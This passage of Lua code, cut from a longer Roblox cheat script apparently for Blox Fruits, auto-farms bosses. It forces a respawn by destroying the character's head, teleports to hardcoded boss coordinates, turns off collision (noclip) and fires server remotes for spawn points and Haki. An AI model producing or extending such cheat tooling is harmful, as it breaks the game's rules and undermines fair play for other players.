    local boss = Section3:Dropdown("Select Boss",BossTable,{"Select Weapon"},function(v)
        _G.Select_Boss = v
    end)
else
    local BossTable = {"Stone","Island Empress","Kilo Admiral","Captain Elephant","Beautiful Pirate","Cake Queen","rip_indra True Form","Longma","Soul Reaper"}
    local boss = Section3:Dropdown("Select Boss",BossTable,{"Select Weapon"},function(v)
        _G.Select_Boss = v
    end)
end
function CheckBossQuest()
    if _G.Select_Boss == "Saber Expert" then
        MsBoss = "Saber Expert"
        NameBoss = "Saber Expert"
        CFrameBoss = CFrame.new(-1458.89502, 29.8870335, -50.633564, 0.858821094, 1.13848939e-08, 0.512275636, -4.85649254e-09, 1, -1.40823326e-08, -0.512275636, 9.6063415e-09, 0.858821094)
        if _G.Select_Boss and (CFrameBoss.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
            game.Players.LocalPlayer.Character.Head:Destroy()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameBoss
            wait(1)
            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
        end
    elseif _G.Select_Boss == "The Saw" then
        MsBoss = "The Saw"
        NameBoss = "The Saw"
        CFrameBoss = CFrame.new(-683.519897, 13.8534927, 1610.87854, -0.290192783, 6.88365773e-08, 0.956968188, 6.98413629e-08, 1, -5.07531119e-08, -0.956968188, 5.21077759e-08, -0.290192783)
        if _G.Select_Boss and (CFrameBoss.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
            game.Players.LocalPlayer.Character.Head:Destroy()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameBoss
            wait(1)
            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
        end
    elseif _G.Select_Boss == "Greybeard" then
        MsBoss = "Greybeard"
        NameBoss = "Greybeard"
        CFrameBoss = CFrame.new(-4955.72949, 80.8163834, 4305.82666, -0.433646321, -1.03394289e-08, 0.901083171, -3.0443168e-08, 1, -3.17633075e-09, -0.901083171, -2.88092288e-08, -0.433646321)
        if _G.Select_Boss and (CFrameBoss.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
            game.Players.LocalPlayer.Character.Head:Destroy()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameBoss
            wait(1)
            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
        end
    elseif _G.Select_Boss == "The Gorilla King" then
        MsBoss = "The Gorilla King"
        NameBoss = "The Gorilla King"
        NameQuestBoss = "JungleQuest"
        LevelQuestBoss = 3
        CFrameQuestBoss = CFrame.new(-1604.12012, 36.8521118, 154.23732, 0.0648873374, -4.70858913e-06, -0.997892559, 1.41431883e-07, 1, -4.70933674e-06, 0.997892559, 1.64442184e-07, 0.0648873374)
        CFrameBoss = CFrame.new(-1223.52808, 6.27936459, -502.292664, 0.310949147, -5.66602516e-08, 0.950426519, -3.37275488e-08, 1, 7.06501808e-08, -0.950426519, -5.40241736e-08, 0.310949147)
        if _G.Select_Boss and (CFrameBoss.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
            game.Players.LocalPlayer.Character.Head:Destroy()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameBoss
            wait(1)
            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
        end
    elseif _G.Select_Boss == "Bobby" then
        MsBoss = "Bobby"
        NameBoss = "Bobby"
        NameQuestBoss = "BuggyQuest1"
        LevelQuestBoss = 3
        CFrameQuestBoss = CFrame.new(-1139.59717, 4.75205183, 3825.16211, -0.959730506, -7.5857054e-09, 0.280922383, -4.06310328e-08, 1, -1.11807175e-07, -0.280922383, -1.18718916e-07, -0.959730506)
        CFrameBoss = CFrame.new(-1147.65173, 32.5966301, 4156.02588, 0.956680477, -1.77109952e-10, -0.29113996, 5.16530874e-10, 1, 1.08897802e-09, 0.29113996, -1.19218679e-09, 0.956680477)
        if _G.Select_Boss and (CFrameBoss.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
            game.Players.LocalPlayer.Character.Head:Destroy()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameBoss
            wait(1)
            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
        end
    elseif _G.Select_Boss == "Yeti" then
        MsBoss = "Yeti"
        NameBoss = "Yeti"
        NameQuestBoss = "SnowQuest"
        LevelQuestBoss = 3
        CFrameQuestBoss = CFrame.new(1384.90247, 87.3078308, -1296.6825, 0.280209213, 2.72035177e-08, -0.959938943, -6.75690828e-08, 1, 8.6151708e-09, 0.959938943, 6.24481444e-08, 0.280209213)
        CFrameBoss = CFrame.new(1221.7356, 138.046906, -1488.84082, 0.349343032, -9.49245944e-08, 0.936994851, 6.29478194e-08, 1, 7.7838429e-08, -0.936994851, 3.17894653e-08, 0.349343032)
        if _G.Select_Boss and (CFrameBoss.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
            game.Players.LocalPlayer.Character.Head:Destroy()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameBoss
            wait(1)
            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
        end
    elseif _G.Select_Boss == "Mob Leader" then
        MsBoss = "Mob Leader"
        NameBoss = "Mob Leader"
        CFrameBoss = CFrame.new(-2848.59399, 7.4272871, 5342.44043, -0.928248107, -8.7248246e-08, 0.371961564, -7.61816636e-08, 1, 4.44474857e-08, -0.371961564, 1.29216433e-08, -0.92824)
        if _G.Select_Boss and (CFrameBoss.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
            game.Players.LocalPlayer.Character.Head:Destroy()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameBoss
            wait(1)
            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
        end
    elseif _G.Select_Boss == "Vice Admiral" then
        MsBoss = "Vice Admiral"
        NameBoss = "Vice Admiral"
        NameQuestBoss = "MarineQuest2"
        LevelQuestBoss = 2
        CFrameQuestBoss = CFrame.new(-5035.42285, 28.6520386, 4324.50293, -0.0611100644, -8.08395768e-08, 0.998130739, -1.57416586e-08, 1, 8.00271849e-08, -0.998130739, -1.08217701e-08, -0.0611100644)
        CFrameBoss = CFrame.new(-5078.45898, 99.6520691, 4402.1665, -0.555574954, -9.88630566e-11, 0.831466436, -6.35508286e-08, 1, -4.23449258e-08, -0.831466436, -7.63661632e-08, -0.555574954)
        if _G.Select_Boss and (CFrameBoss.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
            game.Players.LocalPlayer.Character.Head:Destroy()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameBoss
            wait(1)
            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
        end
    elseif _G.Select_Boss == "Warden" then
        MsBoss = "Warden"
        NameBoss = "Warden"
        NameQuestBoss = "ImpelQuest"
        LevelQuestBoss = 1
        CFrameQuestBoss = CFrame.new(4851.35059, 5.68744135, 743.251282, -0.538484037, -6.68303741e-08, -0.842635691, 1.38001752e-08, 1, -8.81300792e-08, 0.842635691, -5.90851599e-08, -0.538484037)
        CFrameBoss = CFrame.new(5232.5625, 5.26856995, 747.506897, 0.943829298, -4.5439414e-08, 0.330433697, 3.47818627e-08, 1, 3.81658154e-08, -0.330433697, -2.45289105e-08, 0.943829298)
        if _G.Select_Boss and (CFrameBoss.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
            game.Players.LocalPlayer.Character.Head:Destroy()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameBoss
            wait(1)
            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
        end
    elseif _G.Select_Boss == "Chief Warden" then
        MsBoss = "Chief Warden"
        NameBoss = "Chief Warden"
        NameQuestBoss = "ImpelQuest"
        LevelQuestBoss = 2
        CFrameQuestBoss = CFrame.new(4851.35059, 5.68744135, 743.251282, -0.538484037, -6.68303741e-08, -0.842635691, 1.38001752e-08, 1, -8.81300792e-08, 0.842635691, -5.90851599e-08, -0.538484037)
        CFrameBoss = CFrame.new(5232.5625, 5.26856995, 747.506897, 0.943829298, -4.5439414e-08, 0.330433697, 3.47818627e-08, 1, 3.81658154e-08, -0.330433697, -2.45289105e-08, 0.943829298)
        if _G.Select_Boss and (CFrameBoss.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
            game.Players.LocalPlayer.Character.Head:Destroy()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameBoss
            wait(1)
            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
        end
    elseif _G.Select_Boss == "Swan" then
        MsBoss = "Swan"
        NameBoss = "Swan"
        NameQuestBoss = "ImpelQuest"
        LevelQuestBoss = 3
        CFrameQuestBoss = CFrame.new(4851.35059, 5.68744135, 743.251282, -0.538484037, -6.68303741e-08, -0.842635691, 1.38001752e-08, 1, -8.81300792e-08, 0.842635691, -5.90851599e-08, -0.538484037)
        CFrameBoss = CFrame.new(5232.5625, 5.26856995, 747.506897, 0.943829298, -4.5439414e-08, 0.330433697, 3.47818627e-08, 1, 3.81658154e-08, -0.330433697, -2.45289105e-08, 0.943829298)
        if _G.Select_Boss and (CFrameBoss.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
            game.Players.LocalPlayer.Character.Head:Destroy()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameBoss
            wait(1)
            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
        end
    elseif _G.Select_Boss == "Magma Admiral" then
        MsBoss = "Magma Admiral"
        NameBoss = "Magma Admiral"
        NameQuestBoss = "MagmaQuest"
        LevelQuestBoss = 3
        CFrameQuestBoss = CFrame.new(-5317.07666, 12.2721891, 8517.41699, 0.51175487, -2.65508806e-08, -0.859131515, -3.91131572e-08, 1, -5.42026761e-08, 0.859131515, 6.13418294e-08, 0.51175487)
        CFrameBoss = CFrame.new(-5530.12646, 22.8769703, 8859.91309, 0.857838571, 2.23414389e-08, 0.513919294, 1.53689133e-08, 1, -6.91265853e-08, -0.513919294, 6.71978384e-08, 0.857838571)
        if _G.Select_Boss and (CFrameBoss.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
            game.Players.LocalPlayer.Character.Head:Destroy()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameBoss
            wait(1)
            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
        end
    elseif _G.Select_Boss == "Fishman Lord" then
        MsBoss = "Fishman Lord"
        NameBoss = "Fishman Lord"
        NameQuestBoss = "FishmanQuest"
        LevelQuestBoss = 3
        CFrameQuestBoss = CFrame.new(61123.0859, 18.5066795, 1570.18018, 0.927145958, 1.0624845e-07, 0.374700129, -6.98219367e-08, 1, -1.10790765e-07, -0.374700129, 7.65569368e-08, 0.927145958)
        CFrameBoss = CFrame.new(61351.7773, 31.0306778, 1113.31409, 0.999974668, 0, -0.00714713801, 0, 1.00000012, 0, 0.00714714266, 0, 0.999974549)
        if _G.Select_Boss and (CFrameBoss.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
            game.Players.LocalPlayer.Character.Head:Destroy()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameBoss
            wait(1)
            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
        end
    elseif _G.Select_Boss == "Wysper" then
        MsBoss = "Wysper"
        NameBoss = "Wysper"
        NameQuestBoss = "SkyExp1Quest"
        LevelQuestBoss = 3
        CFrameQuestBoss = CFrame.new(-7862.94629, 5545.52832, -379.833954, 0.462944925, 1.45838088e-08, -0.886386991, 1.0534996e-08, 1, 2.19553424e-08, 0.886386991, -1.95022007e-08, 0.462944925)
        CFrameBoss = CFrame.new(-7925.48389, 5550.76074, -636.178345, 0.716468513, -1.22915289e-09, 0.697619379, 3.37381434e-09, 1, -1.70304748e-09, -0.697619379, 3.57381835e-09, 0.716468513)
        if _G.Select_Boss and (CFrameBoss.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
            game.Players.LocalPlayer.Character.Head:Destroy()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameBoss
            wait(1)
            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
        end
    elseif _G.Select_Boss == "Thunder God" then
        MsBoss = "Thunder God"
        NameBoss = "Thunder God"
        NameQuestBoss = "SkyExp2Quest"
        LevelQuestBoss = 3
        CFrameQuestBoss = CFrame.new(-7902.78613, 5635.99902, -1411.98706, -0.0361216255, -1.16895912e-07, 0.999347389, 1.44533963e-09, 1, 1.17024491e-07, -0.999347389, 5.6715117e-09, -0.0361216255)
        CFrameBoss = CFrame.new(-7917.53613, 5616.61377, -2277.78564, 0.965189934, 4.80563429e-08, -0.261550069, -6.73089886e-08, 1, -6.46515304e-08, 0.261550069, 8.00056768e-08, 0.965189934)
        if _G.Select_Boss and (CFrameBoss.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
            game.Players.LocalPlayer.Character.Head:Destroy()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameBoss
            wait(1)
            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
        end
    elseif _G.Select_Boss == "Cyborg" then
        MsBoss = "Cyborg"
        NameBoss = "Cyborg"
        NameQuestBoss = "FountainQuest"
        LevelQuestBoss = 3
        CFrameQuestBoss = CFrame.new(5253.54834, 38.5361786, 4050.45166, -0.0112687312, -9.93677887e-08, -0.999936521, 2.55291371e-10, 1, -9.93769547e-08, 0.999936521, -1.37512213e-09, -0.0112687312)
        CFrameBoss = CFrame.new(6041.82813, 52.7112198, 3907.45142, -0.563162148, 1.73805248e-09, -0.826346457, -5.94632716e-08, 1, 4.26280238e-08, 0.826346457, 7.31437524e-08, -0.563162148)
        
    elseif _G.Select_Boss == "Diamond" then
        MsBoss = "Diamond"
        NameBoss = "Diamond"
        NameQuestBoss = "Area1Quest"
        LevelQuestBoss = 3
        CFrameQuestBoss = CFrame.new(-424.080078, 73.0055847, 1836.91589, 0.253544956, -1.42165932e-08, 0.967323601, -6.00147771e-08, 1, 3.04272909e-08, -0.967323601, -6.5768397e-08, 0.253544956)
        CFrameBoss = CFrame.new(-1736.26587, 198.627731, -236.412857, -0.997808516, 0, -0.0661673471, 0, 1, 0, 0.0661673471, 0, -0.997808516)
        if _G.Select_Boss and (CFrameBoss.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
            game.Players.LocalPlayer.Character.Head:Destroy()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameBoss
            wait(1)
            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
        end
    elseif _G.Select_Boss == "Jeremy" then
        MsBoss = "Jeremy"
        NameBoss = "Jeremy"
        NameQuestBoss = "Area2Quest"
        LevelQuestBoss = 3
        CFrameQuestBoss = CFrame.new(632.698608, 73.1055908, 918.666321, -0.0319722369, 8.96074881e-10, -0.999488771, 1.36326533e-10, 1, 8.92172336e-10, 0.999488771, -1.07732087e-10, -0.0319722369)
        CFrameBoss = CFrame.new(2203.76953, 448.966034, 752.731079, -0.0217453763, 0, -0.999763548, 0, 1, 0, 0.999763548, 0, -0.0217453763)
        if _G.Select_Boss and (CFrameBoss.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
            game.Players.LocalPlayer.Character.Head:Destroy()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameBoss
            wait(1)
            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
        end
    elseif _G.Select_Boss == "Fajita" then
        MsBoss = "Fajita"
        NameBoss = "Fajita"
        NameQuestBoss = "MarineQuest3"
        LevelQuestBoss = 3
        CFrameQuestBoss = CFrame.new(-2442.65015, 73.0511475, -3219.11523, -0.873540044, 4.2329841e-08, -0.486752301, 5.64383384e-08, 1, -1.43220786e-08, 0.486752301, -3.99823996e-08, -0.873540044)
        CFrameBoss = CFrame.new(-2297.40332, 115.449463, -3946.53833, 0.961227536, -1.46645796e-09, -0.275756449, -2.3212845e-09, 1, -1.34094433e-08, 0.275756449, 1.35296352e-08, 0.961227536)
        if _G.Select_Boss and (CFrameBoss.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
            game.Players.LocalPlayer.Character.Head:Destroy()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameBoss
            wait(1)
            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
        end
    elseif _G.Select_Boss == "Don Swan" then
        MsBoss = "Don Swan"
        NameBoss = "Don Swan"
        CFrameBoss = CFrame.new(2288.802, 15.1870775, 863.034607, 0.99974072, -8.41247214e-08, -0.0227668174, 8.4774733e-08, 1, 2.75850098e-08, 0.0227668174, -2.95079072e-08, 0.99974072)
        if _G.Select_Boss and (CFrameBoss.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
            game.Players.LocalPlayer.Character.Head:Destroy()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameBoss
            wait(1)
            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
        end
    elseif _G.Select_Boss == "Smoke Admiral" then
        MsBoss = "Smoke Admiral"
        NameBoss = "Smoke Admiral"
        NameQuestBoss = "IceSideQuest"
        LevelQuestBoss = 3
        CFrameQuestBoss = CFrame.new(-6059.96191, 15.9868021, -4904.7373, -0.444992423, -3.0874483e-09, 0.895534337, -3.64098796e-08, 1, -1.4644522e-08, -0.895534337, -3.91229982e-08, -0.444992423)
        CFrameBoss = CFrame.new(-5115.72754, 23.7664986, -5338.2207, 0.251453817, 1.48345061e-08, -0.967869282, 4.02796978e-08, 1, 2.57916977e-08, 0.967869282, -4.54708946e-08, 0.251453817)
        if _G.Select_Boss and (CFrameBoss.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
            game.Players.LocalPlayer.Character.Head:Destroy()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameBoss
            wait(1)
            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
        end
    elseif _G.Select_Boss == "Cursed Captain" then
        MsBoss = "Cursed Captain"
        NameBoss = "Cursed Captain"
        CFrameBoss = CFrame.new(916.928589, 181.092773, 33422, -0.999505103, 9.26310495e-09, 0.0314563364, 8.42916226e-09, 1, -2.6643713e-08, -0.0314563364, -2.63653774e-08, -0.999505103)
        if _G.Select_Boss and (CFrameBoss.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
            game.Players.LocalPlayer.Character.Head:Destroy()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameBoss
            wait(1)
            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
        end
    elseif _G.Select_Boss == "Darkbeard" then
        MsBoss = "Darkbeard"
        NameBoss = "Darkbeard"
        CFrameBoss = CFrame.new(3876.00366, 24.6882591, -3820.21777, -0.976951957, 4.97356325e-08, 0.213458836, 4.57335361e-08, 1, -2.36868622e-08, -0.213458836, -1.33787044e-08, -0.976951957)
        if _G.Select_Boss and (CFrameBoss.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
            game.Players.LocalPlayer.Character.Head:Destroy()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameBoss
            wait(1)
            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
        end
    elseif _G.Select_Boss == "Order" then
        MsBoss = "Order"
        NameBoss = "Order"
        CFrameBoss = CFrame.new(-6221.15039, 16.2351036, -5045.23584, -0.380726993, 7.41463495e-08, 0.924687505, 5.85604774e-08, 1, -5.60738549e-08, -0.924687505, 3.28013137e-08, -0.380726993)
        if _G.Select_Boss and (CFrameBoss.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
            game.Players.LocalPlayer.Character.Head:Destroy()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameBoss
            wait(1)
            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
        end
    elseif _G.Select_Boss == "Awakened Ice Admiral" then
        MsBoss = "Awakened Ice Admiral"
        NameBoss = "Awakened Ice Admiral"
        NameQuestBoss = "FrostQuest"
        LevelQuestBoss = 3
        CFrameQuestBoss = CFrame.new(5669.33203, 28.2118053, -6481.55908, 0.921275556, -1.25320829e-08, 0.388910472, 4.72230788e-08, 1, -7.96414241e-08, -0.388910472, 9.17372489e-08, 0.921275556)
        CFrameBoss = CFrame.new(6407.33936, 340.223785, -6892.521, 0.49051559, -5.25310213e-08, -0.871432424, -2.76146022e-08, 1, -7.58250565e-08, 0.871432424, 6.12576301e-08, 0.49051559)
        if _G.Select_Boss and (CFrameBoss.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
            game.Players.LocalPlayer.Character.Head:Destroy()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameBoss
            wait(1)
            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
        end
    elseif _G.Select_Boss == "Tide Keeper" then
        MsBoss = "Tide Keeper"
        NameBoss = "Tide Keeper"
        NameQuestBoss = "ForgottenQuest"             
        LevelQuestBoss = 3
        CFrameQuestBoss = CFrame.new(-3053.89648, 236.881363, -10148.2324, -0.985987961, -3.58504737e-09, 0.16681771, -3.07832915e-09, 1, 3.29612559e-09, -0.16681771, 2.73641976e-09, -0.985987961)
        CFrameBoss = CFrame.new(-3570.18652, 123.328949, -11555.9072, 0.465199202, -1.3857326e-08, 0.885206044, 4.0332897e-09, 1, 1.35347511e-08, -0.885206044, -2.72606271e-09, 0.465199202)
        if _G.Select_Boss and (CFrameBoss.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
            game.Players.LocalPlayer.Character.Head:Destroy()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameBoss
            wait(1)
            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
        end
    elseif _G.Select_Boss == "Stone" then
        MsBoss = "Stone"
        NameBoss = "Stone"
        NameQuestBoss = "PiratePortQuest"             
        LevelQuestBoss = 3
        CFrameQuestBoss = CFrame.new(-290, 44, 5577)
        CFrameBoss = CFrame.new(-1085, 40, 6779)
        if _G.Select_Boss and (CFrameBoss.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
            game.Players.LocalPlayer.Character.Head:Destroy()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameBoss
            wait(1)
            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
        end
    elseif _G.Select_Boss == "Island Empress" then
        MsBoss = "Island Empress"
        NameBoss = "Island Empress"
        NameQuestBoss = "AmazonQuest2"             
        LevelQuestBoss = 3
        CFrameQuestBoss = CFrame.new(5443, 602, 752)
        CFrameBoss = CFrame.new(5659, 602, 244)
        if _G.Select_Boss and (CFrameBoss.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
            game.Players.LocalPlayer.Character.Head:Destroy()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameBoss
            wait(1)
            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
        end
    elseif _G.Select_Boss == "Kilo Admiral" then
        MsBoss = "Kilo Admiral"
        NameBoss = "Kilo Admiral"
        NameQuestBoss = "MarineTreeIsland"             
        LevelQuestBoss = 3
        CFrameQuestBoss = CFrame.new(2178, 29, -6737)
        CFrameBoss =CFrame.new(2846, 433, -7100)
        if _G.Select_Boss and (CFrameBoss.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
            game.Players.LocalPlayer.Character.Head:Destroy()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameBoss
            wait(1)
            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
        end
    elseif _G.Select_Boss == "Captain Elephant" then
        MsBoss = "Captain Elephant"
        NameBoss = "Captain Elephant"
        NameQuestBoss = "DeepForestIsland"             
        LevelQuestBoss = 3
        CFrameQuestBoss = CFrame.new(-13232, 333, -7631)
        CFrameBoss = CFrame.new(-13221, 325, -8405)
        if _G.Select_Boss and (CFrameBoss.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
            game.Players.LocalPlayer.Character.Head:Destroy()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameBoss
            wait(1)
            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
        end
    elseif _G.Select_Boss == "Beautiful Pirate" then
        MsBoss = "Beautiful Pirate"
        NameBoss = "Beautiful Pirate"
        NameQuestBoss = "DeepForestIsland2"             
        LevelQuestBoss = 3
        CFrameQuestBoss = CFrame.new(-12686, 391, -9902)
        CFrameBoss = CFrame.new(5182, 23, -20)
        if _G.Select_Boss and (CFrameBoss.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
            game.Players.LocalPlayer.Character.Head:Destroy()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameBoss
            wait(1)
            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
        end
    elseif _G.Select_Boss == "Cake Queen" then
        MsBoss = "Cake Queen"
        NameBoss = "Cake Queen"
        NameQuestBoss = "IceCreamIslandQuest"             
        LevelQuestBoss = 3
        CFrameQuestBoss = CFrame.new(-716, 382, -11010)
        CFrameBoss = CFrame.new(-821, 66, -10965)
        if _G.Select_Boss and (CFrameBoss.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
            game.Players.LocalPlayer.Character.Head:Destroy()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameBoss
            wait(1)
            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
        end
    elseif _G.Select_Boss == "rip_indra True Form" then
        MsBoss = "rip_indra True Form"
        NameBoss = "rip_indra True Form"
        CFrameBoss = CFrame.new(-5359, 424, -2735)
        if _G.Select_Boss and (CFrameBoss.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
            game.Players.LocalPlayer.Character.Head:Destroy()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameBoss
            wait(1)
            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
        end
    elseif _G.Select_Boss == "Longma" then
        MsBoss = "Longma"
        NameBoss = "Longma"
        CFrameBoss = CFrame.new(-10248.3936, 353.79129, -9306.34473)
        if _G.Select_Boss and (CFrameBoss.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
            game.Players.LocalPlayer.Character.Head:Destroy()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameBoss
            wait(1)
            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
        end
    elseif _G.Select_Boss == "Soul Reaper" then
        MsBoss = "Soul Reaper"
        NameBoss = "Soul Reaper"
        CFrameBoss = CFrame.new(-9515.62109, 315.925537, 6691.12012)
        if _G.Select_Boss and (CFrameBoss.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
            game.Players.LocalPlayer.Character.Head:Destroy()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameBoss
            wait(1)
            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
        end
    end
end
Section3:Toggle("Auto Kill Boss",false,function(v)
    _G.Auto_Farm_Boss = v
end)
task.spawn(function()
    while wait() do
    pcall(function()
    if _G.AutoFarmL then
        for _, no in pairs(game:GetService("Players").LocalPlayer.Character:GetDescendants()) do
            if no:IsA("BasePart") then
                no.CanCollide = false    
            end
        end
    else
        if game:GetService("Players").LocalPlayer.Character.HumanoidRootPart:FindFirstChild("BodyClip") then
        game:GetService("Players").LocalPlayer.Character.HumanoidRootPart:FindFirstChild("BodyClip"):Destroy()
        end
    end
    end)
    end
    end)
    
    function AutoHaki()
        if not game:GetService("Players").LocalPlayer.Character:FindFirstChild("HasBuso") then
            wait(1)
            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("Buso")
        end
    end
    local placeId = game.PlaceId;
                        if placeId == 2753915549 then
                            OldWorld = true;
                        elseif placeId == 4442272183 then
                            NewWorld = true;
                        elseif placeId == 7449423635 then
                            Three = true;
                            do
                            local count = 0;
